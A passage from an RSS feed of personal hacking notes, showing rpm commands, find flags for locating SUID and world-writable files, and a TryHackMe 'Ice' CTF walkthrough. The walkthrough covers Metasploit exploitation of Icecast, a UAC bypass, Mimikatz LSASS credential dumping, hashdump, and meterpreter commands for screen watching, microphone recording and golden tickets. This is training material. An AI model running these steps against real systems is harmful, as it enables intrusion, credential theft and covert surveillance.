&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;rpm&lt;/span&gt; -qa&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List files in an installed package&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;rpm&lt;/span&gt; -ql &lt;span class=&quot;va&quot;&gt;$PACKAGE_NAME&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List the package that owns a particular file&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-10&quot;&gt;&lt;a href=&quot;#cb2-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-11&quot;&gt;&lt;a href=&quot;#cb2-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;rpm&lt;/span&gt; -qf &lt;span class=&quot;va&quot;&gt;$FULL_PATH_TO_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.cyberciti.biz/faq/howto-list-installed-rpm-package/&quot;&gt;Linux rpm List Installed Packages Command&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://linuxhint.com/rpm-list-files-in-package/&quot;&gt;RPM List Files That are in a Package&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.thegeekdiary.com/how-to-find-which-rpm-package-provides-a-specific-file-or-library-in-rhel-centos/&quot;&gt;How to find which rpm package provides a specific file or library in RHEL / CentOS&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Match%20Files%20to%20Packages.md</guid>
		</item>
		<item>
			<title>How to Use "find" With File Metadata</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Use%20%22find%22%20With%20File%20Metadata.md</link>
			<description>&lt;p&gt;Some useful find flags related to file metadata.&lt;/p&gt;&lt;h2 id=&quot;-user-and--group&quot;&gt;-user and -group&lt;/h2&gt;&lt;p&gt;Matches files owned by a particular user or group (both numeric and symbolic-readable names are allowed).&lt;/p&gt;&lt;h2 id=&quot;-size&quot;&gt;-size&lt;/h2&gt;&lt;p&gt;Matches files of size n.&lt;/p&gt;&lt;p&gt;Prefix n with + or - to match files &lt;em&gt;strictly&lt;/em&gt; greater than or less than n in size. To specify useful sizes, use a suffix.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;c - Bytes&lt;/li&gt;&lt;li&gt;k - Kilobytes&lt;/li&gt;&lt;li&gt;M - Megabytes&lt;/li&gt;&lt;li&gt;G - Gigabytes&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;For example, use &lt;code&gt;-size +4G&lt;/code&gt; to find files over 4 GB (i.e., those that can't be written to a FAT32 file system).&lt;/p&gt;&lt;h2 id=&quot;-perm&quot;&gt;-perm&lt;/h2&gt;&lt;p&gt;Matches files with a given permission. Both numeric and symbolic permissions are allowed.&lt;/p&gt;&lt;p&gt;Use the / or - prefix to match files with &lt;em&gt;any&lt;/em&gt; of the specified permissions or &lt;em&gt;at least&lt;/em&gt; the specified permissions. For example, &lt;code&gt;-perm -644&lt;/code&gt; will match any file where the current user has &lt;em&gt;at least&lt;/em&gt; read + write access and any other user has &lt;em&gt;at least&lt;/em&gt; read access (so, &quot;-&quot; requires the specified permissions, but is agnostic as to the presence/absence of additional permissions). Likewise, &lt;code&gt;-perm /666&lt;/code&gt; will match files where the current user has read + write access and/or the current group has read + write access and/or everyone has read + write access (so, &quot;/&quot; requires that at least &lt;em&gt;one&lt;/em&gt; of the specified permissions groups matches exactly, but is agnostic to the state of any other group outside of that match).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Symbolic%20Permissions.md&quot;&gt;Symbolic Permissions&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;find-suid-files&quot;&gt;Find SUID Files&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type f -perm -04000 -ls &lt;span class=&quot;op&quot;&gt;2&amp;gt;&lt;/span&gt;/dev/null&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type f -perm -u=s -ls &lt;span class=&quot;op&quot;&gt;2&amp;gt;&lt;/span&gt;/dev/null&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;find-suid-and-sgid-executables&quot;&gt;Find SUID and SGID Executables&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type f &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;\(&lt;/span&gt; -perm -u+s -o -perm -g+s &lt;span class=&quot;dt&quot;&gt;\)&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-exec&lt;/span&gt; ls -l {} &lt;span class=&quot;dt&quot;&gt;\;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;2&amp;gt;&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;find-world-writableexecutable-folders&quot;&gt;Find World Writable/Executable Folders&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type d -a &lt;span class=&quot;dt&quot;&gt;\(&lt;/span&gt; -perm -o+w -perm -o+x &lt;span class=&quot;dt&quot;&gt;\)&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;2&amp;gt;&lt;/span&gt;/dev/null&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;-xmin-and--xtime&quot;&gt;-Xmin and -Xtime&lt;/h2&gt;&lt;p&gt;Matches files accessed (a), had their &lt;em&gt;contents&lt;/em&gt; modified (m), or had their &lt;em&gt;inode&lt;/em&gt; changed (c) n minutes (-Xmin) or days (-Xtime) ago.&lt;/p&gt;&lt;p&gt;All mtime changes are ctime changes, but the reverse is not necessarily true.&lt;/p&gt;&lt;p&gt;Prefix n with + or - to match files &lt;em&gt;strictly&lt;/em&gt; before or after the specified time in the &lt;em&gt;past&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Matches files accessed *more* than 30 minutes ago&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; . -type f -amin +30&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-5&quot;&gt;&lt;a href=&quot;#cb5-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Matches files modified *less* than 7 days ago&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-6&quot;&gt;&lt;a href=&quot;#cb5-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-7&quot;&gt;&lt;a href=&quot;#cb5-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; . -type f -mtime -7&lt;/span&gt;
&lt;span id=&quot;cb5-8&quot;&gt;&lt;a href=&quot;#cb5-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-9&quot;&gt;&lt;a href=&quot;#cb5-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Matches files modified *today*&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-10&quot;&gt;&lt;a href=&quot;#cb5-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-11&quot;&gt;&lt;a href=&quot;#cb5-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; . -type f -mtime 0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/8346852/how-to-modify-last-status-change-ctime-property-of-a-file-in-unix#8346905&quot;&gt;How to modify &quot;last status change&quot; (ctime) property of a file in Unix?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Use%20%22find%22%20With%20File%20Metadata.md</guid>
		</item>
		<item>
			<title>Ice</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Ice.md</link>
			<description>&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;&lt;p&gt;The machine we'll be attacking is at 10.10.55.173. Since it's a Windows box, we know that it won't respond to &lt;code&gt;ping&lt;/code&gt; by default.&lt;/p&gt;&lt;p&gt;As usual, we'll start out with an nmap scan:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA ice -Pn -A -T4 -sS -script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.55.173&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives us:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Dec  7 20:55:44 2021 as: nmap -v -oA ice -Pn -A -T4 -sS -script vuln -p- 10.10.55.173
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Increasing send delay for 10.10.55.173 from 0 to 5 due to 387 out of 967 dropped probes since last increase.
Increasing send delay for 10.10.55.173 from 5 to 10 due to 48 out of 119 dropped probes since last increase.
Nmap scan report for 10.10.55.173
Host is up (0.18s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
8000/tcp  open  http               Icecast streaming media server
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-iis-webdav-vuln: Could not determine vulnerability, since root folder is password protected
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server&amp;#39;s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/7%OT=135%CT=1%CU=42453%PV=Y%DS=4%DC=T%G=Y%TM=61B035
OS:3F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M
OS:506NW8ST11%O6=M506ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M506NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Uptime guess: 0.035 days (since Tue Dec  7 20:41:59 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   34.62 ms  10.13.0.1
2   ... 3
4   179.31 ms 10.10.55.173

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  7 21:31:59 2021 -- 1 IP address (1 host up) scanned in 2174.84 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(An interesting effect of the -T4 flag, which uses a slightly more aggressive timing timing profile, is that port discovery seems to happen out-of-orderâ¦)&lt;/p&gt;&lt;p&gt;FLAG 1: What port is MSRDP open on? - 3389&lt;/p&gt;&lt;p&gt;FLAG 2: What service is running on port 8000? - Icecast streaming media server&lt;/p&gt;&lt;p&gt;FLAG 3: What is the hostname of the machine? - DARK-PC&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;gain-access&quot;&gt;Gain Access&lt;/h2&gt;&lt;p&gt;The next few flags are about finding a particular vulnerability for Icecast on &lt;a href=&quot;https://cvedetails.com&quot;&gt;https://cvedetails.com&lt;/a&gt;. There's actually a couple of different vulnerabilities that match the flag descriptions, but after a little trial-and-error we can find the right ones.&lt;/p&gt;&lt;p&gt;FLAG 4: What is a vulnerability impacting Icecast with a CVSS score of 7.5? - Execute Code Overflow&lt;/p&gt;&lt;p&gt;FLAG 5: What is the CVE number for the vulnerability in Flag 4? - CVE-2004-1561&lt;/p&gt;&lt;p&gt;FLAG 6: What is the Metasploit module for exploiting this vulnerability? - exploit/windows/http/icecast_header&lt;/p&gt;&lt;p&gt;FLAG 7: What option must be set to use this module? - RHOSTS&lt;/p&gt;&lt;p&gt;There's not too much to this module - set RHOSTS and LHOST, run, get shell.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2004-1561/&quot;&gt;CVE-2004-1561&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;escalate&quot;&gt;Escalate&lt;/h2&gt;&lt;p&gt;FLAG 8: What shell does Metasploit provide us with? - meterpreter&lt;/p&gt;&lt;p&gt;We can find the current user using the &lt;code&gt;getuid&lt;/code&gt; command.&lt;/p&gt;&lt;p&gt;FLAG 9: What user is running the Icecast process? - Dark-PC/Dark&lt;/p&gt;&lt;p&gt;The &lt;code&gt;sysinfo&lt;/code&gt; command will give us the OS version and architecture.&lt;/p&gt;&lt;p&gt;FLAG 10: What is the build of this Windows system? - Windows 7 (6.1 Build 7601, Service Pack 1)&lt;/p&gt;&lt;p&gt;FLAG 11: What is the system architecture? - x64&lt;/p&gt;&lt;p&gt;We'll now use &lt;code&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt; to find potential paths to elevating privileges.&lt;/p&gt;&lt;p&gt;Unfortunately, for me this only returns one result - &lt;code&gt;exploit/windows/local/ms10_092_schelevator&lt;/code&gt; - which is not accepted as the 12th flag. The flag hint states that the exploit will contain &lt;code&gt;eventvwr&lt;/code&gt;. A quick search through Metasploit shows that the only exploit including this string is &lt;code&gt;exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;, which &lt;em&gt;is&lt;/em&gt; accepted.&lt;/p&gt;&lt;p&gt;FLAG 12: What is the potential exploit &lt;code&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt; returns? - &lt;code&gt;exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;&lt;/p&gt;&lt;p&gt;We can background meterpreter with Ctrl+Z and then switch to this exploit using &lt;code&gt;use exploit/windows/local/bypassuac_eventvwr&lt;/code&gt;. This exploit runs through an existing session, so we need to set this using &lt;code&gt;set SESSION 2&lt;/code&gt;. (I'm on session 2 because I previously backed out an unsuccessfully tried to pop a 64-bit meterpreter shell - I guess Icecast is running as a 32-bit process.)&lt;/p&gt;&lt;p&gt;FLAG 13: What option needs to be set to ensure that our listener IP address is correct? - LHOST&lt;/p&gt;&lt;p&gt;I also tweaked LPORT, as I'm nervous about killing the existing session (which is running on the default port, 4444).&lt;/p&gt;&lt;p&gt;Using &lt;code&gt;run&lt;/code&gt; quickly pops a new shell.&lt;/p&gt;&lt;p&gt;FLAG 14: What permission allows taking ownership of files? - SeTakeOwnershipPrivilege&lt;/p&gt;&lt;h2 id=&quot;looting&quot;&gt;Looting&lt;/h2&gt;&lt;p&gt;In order to harvest credentials from LSASS we'll need to migrate meterpreter to a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS. The print spooler service is a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically.&lt;/p&gt;&lt;p&gt;FLAG 15: What is the name of the print spooler service? - &lt;code&gt;spoolsv.exe&lt;/code&gt;&lt;/p&gt;&lt;pre class=&quot;meterpreter&quot;&gt;&lt;code&gt;migrate -N spoolsv.exe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FLAG 16: What user is the migrated meterpreter process running as after migration? - NT AUTHORITY/SYSTEM&lt;/p&gt;&lt;p&gt;We're going to loot LSASS now using Mimikatz.&lt;/p&gt;&lt;pre class=&quot;meterpreter&quot;&gt;&lt;code&gt;load kiwi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FLAG 17: What command retrieves all credentials from LSASS? - &lt;code&gt;creds_all&lt;/code&gt;&lt;/p&gt;&lt;p&gt;It turns out that Windows loads &lt;em&gt;unhashed&lt;/em&gt; passwords into LSASS for any users with scheduled jobs!&lt;/p&gt;&lt;p&gt;FLAG 18: What is Dark's password? - &lt;code&gt;Password01!&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Mimikatz.md&quot;&gt;Using Mimikatz&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hydra.md&quot;&gt;Using Hydra&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20John%20the%20Ripper.md&quot;&gt;Using John the Ripper&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;past-exploitation&quot;&gt;Past-Exploitation&lt;/h2&gt;&lt;p&gt;FLAG 19: What meterpreter command allows us to dump all of the password hashes stored on the system? - &lt;code&gt;hashdump&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Hashes dumped using &lt;code&gt;hashdump&lt;/code&gt; can be cracked offline using Hydra or John the Ripper.&lt;/p&gt;&lt;p&gt;FLAG 20: What meterpreter command allows us to watch the remote user's desktop in real time? - &lt;code&gt;screenshare&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 21: What meterpreter command allows us to record using the system's microphone? - &lt;code&gt;record_mic&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 22: What meterpreter command can modify timestamps of files on the system? - &lt;code&gt;timestomp&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 23: What meterpreter/kiwi command allows for the creation of a golden ticket? - &lt;code&gt;golden_ticket_create&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Kerberos.md&quot;&gt;Kerberos&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 2 h 39 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/ice&quot;&gt;TryHackMe: Ice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Ice.md</guid>
		</item>
		<item>
			<title>Inclusion</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Inclusion.md</link>
